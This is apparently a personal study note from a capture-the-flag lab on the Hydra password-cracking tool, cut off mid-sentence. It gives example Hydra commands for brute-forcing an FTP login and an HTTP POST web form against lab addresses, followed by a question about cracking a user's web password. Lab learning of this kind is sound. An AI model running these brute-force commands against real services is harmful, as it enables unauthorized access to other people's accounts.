---
{"dg-publish":true,"permalink":"/my-digital-garden/","tags":["gardenEntry"],"created":"2025-02-06T18:51:33.711-05:00","updated":"2025-02-06T19:40:50.075-05:00"}
---

Testing 123

Trying this out again 



# Task 2 - Using Hydra

- Example command to brute force ftp    
    - `hydra -l user -P passlist.txt [ftp://MACHINE_IP](ftp://MACHINE_IP)`
- Another example
    - `hydra -l <username> -P <wordlist> 10.10.71.57 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`


> [!Question]
> **Use Hydra to bruteforce molly's web password. What is flag 1?**

Going to the target IP address gives us a web login from with a username and password,